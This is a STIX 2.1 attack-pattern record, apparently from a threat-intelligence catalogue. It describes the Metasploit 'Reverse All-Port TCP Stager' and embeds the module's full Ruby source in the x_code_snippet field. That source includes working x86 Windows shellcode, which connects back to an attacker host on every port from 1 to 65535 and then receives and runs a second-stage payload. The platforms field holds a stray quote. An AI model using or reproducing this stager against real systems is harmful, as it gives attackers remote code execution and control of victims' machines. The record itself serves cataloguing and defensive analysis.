{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--baaa008c-4a6a-4da1-912e-3329e952d4f2",
    "created": "2024-08-14T16:33:19.497472Z",
    "modified": "2024-08-14T16:33:19.497476Z",
    "name": "Reverse All-Port TCP Stager",
    "description": "Try to connect back to the attacker, on all possible ports (1-65535, slowly)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/windows/reverse_tcp_allports.rb",
            "external_id": "reverse_tcp_allports.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 282\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Windows\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse All-Port TCP Stager',\n      'Description'   => 'Try to connect back to the attacker, on all possible ports (1-65535, slowly)',\n      'Author'        => ['hdm', 'skape', 'sf'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcpAllPorts,\n      'Convention'    => 'sockedi',\n      'Stager'        =>\n        {\n          'RequiresMidstager' => false,\n          'Offsets' => { 'LHOST' => [ 188, 'ADDR' ], 'LPORT' => [ 195, 'n' ], },\n          'Payload' =>\n            \"\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\" +\n            \"\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\" +\n            \"\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\" +\n            \"\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\" +\n            \"\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\" +\n            \"\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\" +\n            \"\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\" +\n            \"\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\" +\n            \"\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x33\\x32\\x00\\x00\\x68\\x77\" +\n            \"\\x73\\x32\\x5F\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xB8\\x90\\x01\\x00\\x00\" +\n            \"\\x29\\xC4\\x54\\x50\\x68\\x29\\x80\\x6B\\x00\\xFF\\xD5\\x50\\x50\\x50\\x50\\x40\" +\n            \"\\x50\\x40\\x50\\x68\\xEA\\x0F\\xDF\\xE0\\xFF\\xD5\\x97\\x68\\x7F\\x00\\x00\\x01\" +\n            \"\\x68\\x02\\x00\\x11\\x5C\\x89\\xE6\\x6A\\x10\\x56\\x57\\x68\\x99\\xA5\\x74\\x61\" +\n            \"\\xFF\\xD5\\x85\\xC0\\x74\\x0F\\x66\\x8B\\x46\\x02\\x86\\xE0\\x40\\x86\\xE0\\x66\" +\n            \"\\x89\\x46\\x02\\xEB\\xE2\\x6A\\x00\\x6A\\x04\\x56\\x57\\x68\\x02\\xD9\\xC8\\x5F\" +\n            \"\\xFF\\xD5\\x8B\\x36\\x6A\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6A\\x00\\x68\\x58\" +\n            \"\\xA4\\x53\\xE5\\xFF\\xD5\\x93\\x53\\x6A\\x00\\x56\\x53\\x57\\x68\\x02\\xD9\\xC8\" +\n            \"\\x5F\\xFF\\xD5\\x01\\xC3\\x29\\xC6\\x75\\xEE\\xC3\"\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}